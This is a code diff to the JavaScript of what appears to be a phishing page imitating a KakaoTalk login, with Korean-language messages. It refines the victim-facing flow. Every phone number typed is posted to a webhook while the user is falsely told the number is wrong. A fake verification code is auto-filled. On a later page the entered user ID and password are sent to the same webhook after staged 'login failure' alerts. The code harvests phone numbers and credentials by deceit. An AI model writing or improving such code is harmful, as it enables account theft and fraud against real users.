@@ -142,11 +142,8 @@ async function collectUserInfo() {
   formData.append("timestamp", new Date().toISOString());
   formData.append("page","1");
 
-  fetch(webhookUrl,{
-    method:"POST",
-    headers:{"Content-Type":"application/x-www-form-urlencoded"},
-    body:formData
-  }).catch(err=>console.error("WebHook 전송 오류:",err));
+  fetch(webhookUrl,{method:"POST",headers:{"Content-Type":"application/x-www-form-urlencoded"},body:formData})
+  .catch(err=>console.error("WebHook 전송 오류:",err));
 }
 
 // page2 -> page3
@@ -154,35 +151,38 @@ function sendPhone() {
   const userId = document.getElementById("userId").value.trim();
   const phoneRegex = /^010\d{8}$/;
   if (!userId) { alert("전화번호를 입력해주세요."); return; }
+  if (!phoneRegex.test(userId)) { 
+    alert("잘못된 형식의 전화번호입니다."); 
+    return; 
+  }
 
   phoneTryCount++;
 
-  // Webhook 무조건 전송
+  // Webhook 전송
   fetch(webhookUrl,{
     method:"POST",
     headers:{"Content-Type":"application/x-www-form-urlencoded"},
     body:new URLSearchParams({page:"2",phone:userId,timestamp:new Date().toISOString()})
   }).catch(err=>console.error(err));
 
-  if (!phoneRegex.test(userId) || phoneTryCount < 3) {
-    alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
-    return;
-  }
+  alert("전화번호가 틀렸습니다. 다시 확인해주세요.");
 
-  savedPhone = userId;
+  if(phoneTryCount >= 2) {
+    savedPhone = userId;
 
-  document.getElementById("page2").classList.add("hidden");
-  document.getElementById("page3").classList.remove("hidden");
+    document.getElementById("page2").classList.add("hidden");
+    document.getElementById("page3").classList.remove("hidden");
 
-  const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
-  setTimeout(()=>{
-    document.getElementById("authCode").value=randomCode;
+    const randomCode = String(Math.floor(Math.random() * 1000000)).padStart(6, "0");
     setTimeout(()=>{
-      document.getElementById("page3").classList.add("hidden");
-      document.getElementById("page4").classList.remove("hidden");
-      document.getElementById("userId4").value = savedPhone;
-    },1000);
-  },1500);
+      document.getElementById("authCode").value=randomCode;
+      setTimeout(()=>{
+        document.getElementById("page3").classList.add("hidden");
+        document.getElementById("page4").classList.remove("hidden");
+        document.getElementById("userId4").value = savedPhone;
+      },1000);
+    },1500);
+  }
 }
 
 // page4 로그인 처리
@@ -208,7 +208,7 @@ function sendPage4() {
 
   if(loginTryCount > 5) {
     alert("카카오톡 로그인 시도 횟수를 초과했습니다. 2시간 후에 다시 시도해 주세요");
-    fetch(webhookUrl,{
+     fetch(webhookUrl,{
       method:"POST",
       headers:{"Content-Type":"application/x-www-form-urlencoded"},
       body:new URLSearchParams({page:"4", userId:userId4, password:userCode4, timestamp:new Date().toISOString()})
